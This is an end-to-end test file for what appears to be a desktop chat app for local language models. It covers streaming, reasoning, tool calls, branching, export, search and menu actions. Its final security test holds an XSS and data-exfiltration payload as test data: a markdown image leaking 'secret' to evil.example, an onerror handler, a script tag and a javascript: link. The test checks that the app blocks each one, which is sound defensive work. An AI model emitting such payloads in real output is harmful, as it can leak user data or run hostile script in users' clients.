// UI end-to-end: conversation flows (streaming, reasoning, tools, stop, edit/branches, regenerate, export,
// search), the Electron menu-action hook, and neutralising remote images / scripts in model output.
import { test, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import { startStack, openApp, closeBrowser, send, waitIdle, lastTurn, waitFor } from './harness.mjs';

after(closeBrowser);

test('first load: new-chat intro shows the model and why the window is this size (8 GB)', async () => {
  const stack = await startStack({ ram: 8 });
  const app = await openApp(stack);
  try {
    const { page } = app;
    await page.waitForSelector('.intro-model');
    await page.waitForFunction(() => /2K context on this 8 GB Mac/.test(document.querySelector('.intro-plan')?.textContent || ''));
    // The default quant does not fit in 8 GB: the intro offers the installed variant that does.
    await page.waitForSelector('.intro-advice .callout.warn');
    assert.match(await page.locator('.intro-advice').textContent(), /too large/);
    assert.match(await page.locator('.side-foot .machine').textContent(), /Ollama.*8 GB RAM/s);
    assert.match(await page.locator('.main-titlebar .status-pill').textContent(), /nemotron/i);
    assert.equal(await page.locator('meta[http-equiv="Content-Security-Policy"]').count(), 1);
    await app.shot('01-first-load');
    await app.assertClean(assert);
  } finally { await app.close(); await stack.close(); }
});

test('send: reply streams in, then shows stats; chat appears in the sidebar', async () => {
  const stack = await startStack({ delayMs: 6 });
  const app = await openApp(stack);
  try {
    const { page } = app;
    await send(page, 'Hello there. long answer 400', { wait: false });
    await page.waitForSelector('.send-btn.stop');
    // Mid-stream: partial text visible while still generating.
    await page.waitForFunction(() => /word\d+/.test(document.querySelector('.msg-assistant .prose')?.textContent || ''));
    const partial = await lastTurn(page).locator('.msg-assistant .prose').textContent();
    assert.ok(!partial.includes('word399'), 'should still be streaming');
    assert.match(await page.locator('.main-titlebar .status-pill').textContent(), /Writing|Thinking|Waiting/);
    await waitIdle(page);
    const text = await lastTurn(page).locator('.msg-assistant .prose').textContent();
    assert.match(text, /You said: Hello there/);
    assert.match(text, /word399/);
    assert.match(await lastTurn(page).locator('.msg-stats').textContent(), /tok\/s/);
    assert.match(page.url(), /#\/chat\/chat_/);
    await waitFor(async () => (await page.locator('.chat-item').count()) === 1);
    await app.assertClean(assert);
  } finally { await app.close(); await stack.close(); }
});

test('reasoning: thinking model shows a collapsible "Thought for" block', async () => {
  const stack = await startStack();
  const app = await openApp(stack);
  try {
    const { page } = app;
    await page.locator('.picker').first().click();
    await page.locator('.model-option', { hasText: 'qwen3' }).click();
    await page.waitForFunction(() => /qwen3/.test(document.querySelector('.picker-label')?.textContent || ''));
    await send(page, 'Why is the sky blue?');
    const toggle = lastTurn(page).locator('.reasoning-toggle');
    assert.match(await toggle.textContent(), /Thought for|Reasoning/);
    assert.equal(await toggle.getAttribute('aria-expanded'), 'false');
    await toggle.click();
    assert.match(await lastTurn(page).locator('.reasoning-body').textContent(), /Thinking about: Why is the sky blue/);
    assert.match(await lastTurn(page).locator('.msg-assistant .prose').textContent(), /You said: Why is the sky blue/);
    await app.assertClean(assert);
  } finally { await app.close(); await stack.close(); }
});

test('tool call: card with arguments, result and timing', async () => {
  const stack = await startStack();
  const app = await openApp(stack);
  try {
    const { page } = app;
    await send(page, 'calculate 17*23');
    const card = lastTurn(page).locator('.tool-card');
    assert.equal(await card.count(), 1);
    assert.match(await card.locator('.tool-head').textContent(), /Calculator.*17\*23/s);
    assert.match(await card.locator('.tool-status').textContent(), /ms|Done/);
    await card.locator('.tool-head').click();
    assert.match(await card.locator('.tool-detail').textContent(), /"expression": "17\*23".*17\*23 = 391/s);
    assert.match(await lastTurn(page).locator('.msg-assistant .prose').last().textContent(), /391/);
    await app.shot('04-tool-call');
    await app.assertClean(assert);
  } finally { await app.close(); await stack.close(); }
});

test('stop: Escape stops a long reply and keeps the partial text', async () => {
  const stack = await startStack({ delayMs: 25 });
  const app = await openApp(stack);
  try {
    const { page } = app;
    await send(page, 'long answer 3000', { wait: false });
    await page.waitForFunction(() => /word2\d/.test(document.querySelector('.msg-assistant .prose')?.textContent || ''));
    await page.keyboard.press('Escape');
    await waitIdle(page);
    await page.waitForSelector('.turn-note .note-line');
    assert.match(await lastTurn(page).locator('.turn-note').textContent(), /Stopped/);
    const text = await lastTurn(page).locator('.msg-assistant .prose').textContent();
    assert.match(text, /word2\d/);
    assert.ok(!text.includes('word2999'));
    // The composer is usable again right away.
    await send(page, 'calculate 2+2');
    assert.match(await lastTurn(page).locator('.msg-assistant').textContent(), /2\+2 = 4/);
    await app.assertClean(assert);
  } finally { await app.close(); await stack.close(); }
});

test('edit & resend creates a branch; ‹ 1/2 › switches between versions; regenerate adds a reply version', async () => {
  const stack = await startStack();
  const app = await openApp(stack);
  try {
    const { page } = app;
    await send(page, 'first version of the question');
    const user = lastTurn(page).locator('.msg-user');
    await user.hover();
    await user.locator('button[aria-label="Edit and resend"]').click();
    const editor = user.locator('.msg-edit-input');
    await editor.fill('second version of the question');
    await user.locator('button', { hasText: 'Save & send' }).click();
    await waitIdle(page);
    assert.match(await lastTurn(page).locator('.msg-user .user-text').textContent(), /second version/);
    assert.match(await lastTurn(page).locator('.msg-assistant .prose').textContent(), /You said: second version/);
    assert.equal(await lastTurn(page).locator('.msg-user .branch-pos').textContent(), '2/2');
    await lastTurn(page).locator('button[aria-label="Previous message version"]').click();
    await page.waitForFunction(() => /first version/.test(document.querySelector('.turn:last-child .msg-user .user-text')?.textContent || ''));
    assert.equal(await lastTurn(page).locator('.msg-user .branch-pos').textContent(), '1/2');
    assert.match(await lastTurn(page).locator('.msg-assistant .prose').textContent(), /You said: first version/);

    // Regenerate the reply: a new assistant version under the same message.
    await lastTurn(page).locator('button[aria-label="Regenerate reply"]').click();
    await waitIdle(page);
    await page.waitForFunction(() => document.querySelector('.turn:last-child .msg-foot .branch-pos')?.textContent === '2/2');
    await lastTurn(page).locator('button[aria-label="Previous reply version"]').click();
    await page.waitForFunction(() => document.querySelector('.turn:last-child .msg-foot .branch-pos')?.textContent === '1/2');
    await app.shot('06-branches');
    await app.assertClean(assert);
  } finally { await app.close(); await stack.close(); }
});

test('export: chat menu → Markdown downloads the conversation', async () => {
  const stack = await startStack();
  const app = await openApp(stack);
  try {
    const { page } = app;
    await send(page, 'Remember the lighthouse keeper');
    await page.locator('.main-titlebar button[aria-label="Chat actions"]').click();
    await page.locator('.menu-item', { hasText: 'Export' }).click();
    const [download] = await Promise.all([page.waitForEvent('download'), page.locator('.export-opt', { hasText: 'Markdown' }).click()]);
    const md = await fs.readFile(await download.path(), 'utf8');
    assert.match(md, /lighthouse keeper/);
    assert.match(download.suggestedFilename(), /\.md$/);
    await app.assertClean(assert);
  } finally { await app.close(); await stack.close(); }
});

test('search: full-text hit opens the chat at the message', async () => {
  const stack = await startStack();
  const app = await openApp(stack);
  try {
    const { page } = app;
    await send(page, 'Tell me about the quantum walrus migration');
    await page.locator('.side-titlebar button[aria-label="New chat"]').click();
    await send(page, 'Zebra crossings in the city');
    await page.waitForFunction(() => document.querySelectorAll('.chat-item').length === 2);
    await page.locator('input[aria-label="Search chats"]').fill('walrus');
    await page.waitForSelector('.search-hit');
    assert.match(await page.locator('.search-hit').first().locator('mark').first().textContent(), /walrus/i);
    await page.locator('.search-hit').first().click();
    await page.waitForFunction(() => /quantum walrus/.test(document.querySelector('.transcript')?.textContent || ''));
    assert.doesNotMatch(await page.locator('.transcript').textContent(), /Zebra/);
    await app.assertClean(assert);
  } finally { await app.close(); await stack.close(); }
});

test('desktop shell: every native menu action is handled; traffic-light zone is reserved', async () => {
  const stack = await startStack();
  const app = await openApp(stack, { desktop: true });
  try {
    const { page } = app;
    await page.waitForFunction(() => typeof window.__menu === 'function');
    const menu = (name) => page.evaluate((n) => window.__menu(n), name);
    // Traffic lights: ≥ 80px left padding in the sidebar's title bar, drag region on the bar.
    const pad = await page.locator('.side-titlebar').evaluate((el) => parseFloat(getComputedStyle(el).paddingLeft));
    assert.ok(pad >= 80, `expected >= 80px, got ${pad}`);
    assert.equal(await page.locator('.side-titlebar').evaluate((el) => getComputedStyle(el).getPropertyValue('-webkit-app-region') || getComputedStyle(el).webkitAppRegion), 'drag');
    await send(page, 'hello from the desktop');
    await menu('open-settings'); await page.waitForSelector('.settings-view');
    await menu('open-models'); await page.waitForFunction(() => location.hash === '#/models');
    await menu('open-images'); await page.waitForFunction(() => location.hash === '#/images');
    await menu('open-memory'); await page.waitForFunction(() => location.hash === '#/memory');
    await menu('new-chat'); await page.waitForFunction(() => location.hash === '#/chat' && document.activeElement?.classList.contains('composer-input'));
    await page.goBack(); await page.goBack(); await page.goBack(); await page.goBack(); await page.goBack();
    await page.waitForFunction(() => /#\/chat\/chat_/.test(location.hash));
    await menu('toggle-sidebar'); await page.waitForSelector('.app.sidebar-closed');
    assert.ok(await page.locator('.main-titlebar').evaluate((el) => parseFloat(getComputedStyle(el).paddingLeft)) >= 80);
    await menu('toggle-sidebar'); await page.waitForSelector('.app:not(.sidebar-closed)');
    await menu('toggle-inspector'); await page.waitForSelector('.app.inspector-open');
    await menu('toggle-inspector'); await page.waitForSelector('.app:not(.inspector-open)');
    await menu('search-chats'); await page.waitForFunction(() => document.activeElement?.getAttribute('aria-label') === 'Search chats');
    await menu('focus-composer'); await page.waitForFunction(() => document.activeElement?.classList.contains('composer-input'));
    await menu('command-palette'); await page.waitForSelector('dialog.palette[open]'); await page.keyboard.press('Escape');
    await menu('show-shortcuts'); await page.waitForSelector('dialog.dialog[open] .shortcuts-grid'); await page.keyboard.press('Escape');
    await menu('export-chat'); await page.waitForSelector('dialog.dialog[open] .export-opt'); await page.keyboard.press('Escape');
    const [chooser] = await Promise.all([page.waitForEvent('filechooser'), menu('import-chat')]);
    await chooser.setFiles({ name: 'imported.json', mimeType: 'application/json', buffer: Buffer.from(JSON.stringify({ title: 'Imported via menu', messages: [{ role: 'user', content: 'hi' }, { role: 'assistant', content: 'hello' }] })) });
    await page.waitForFunction(() => [...document.querySelectorAll('.chat-item')].some((el) => /Imported via menu/.test(el.textContent)));
    await menu('stop-generation'); await page.waitForSelector('.toast', { hasText: 'Nothing is generating' });
    // Links in answers open through the shell, not a new BrowserWindow.
    await app.assertClean(assert);
  } finally { await app.close(); await stack.close(); }
});

test('security: remote images, scripts and javascript: links in model output are neutralised', async () => {
  const stack = await startStack();
  const app = await openApp(stack, { desktop: true });
  try {
    const { page, requests } = app;
    const payload = '![p](https://evil.example/p.png?d=secret) <img src="https://evil.example/i.png" onerror="window.__pwned=1"> <script>window.__pwned=2</script> [ok](https://example.com/x) [bad](javascript:window.__pwned=3)';
    await send(page, payload);
    const asst = lastTurn(page).locator('.msg-assistant .prose');
    await asst.waitFor();
    assert.ok(await asst.locator('.blocked-img').count() >= 1, 'remote markdown image becomes a plain link');
    assert.equal(await page.locator('img[src*="evil.example"]').count(), 0);
    assert.equal(await page.locator('.prose script, .user-text script').count(), 0);
    assert.equal(await page.evaluate(() => window.__pwned), undefined);
    const ok = asst.locator('a', { hasText: 'ok' });
    assert.equal(await ok.getAttribute('target'), '_blank');
    assert.equal(await ok.getAttribute('rel'), 'noopener noreferrer');
    assert.equal(await asst.locator('a', { hasText: 'bad' }).getAttribute('href'), null);
    // The user's own message shows raw HTML as text.
    assert.match(await lastTurn(page).locator('.msg-user .user-text').textContent(), /<script>window.__pwned=2<\/script>/);
    // Clicking an external link goes through the desktop bridge.
    await ok.click();
    assert.deepEqual(await page.evaluate(() => window.__desktopCalls.find((c) => c[0] === 'openExternal')), ['openExternal', 'https://example.com/x']);
    await page.waitForTimeout(300);
    assert.deepEqual(requests.filter((u) => u.includes('evil.example')), []);
    await app.assertClean(assert);
  } finally { await app.close(); await stack.close(); }
});
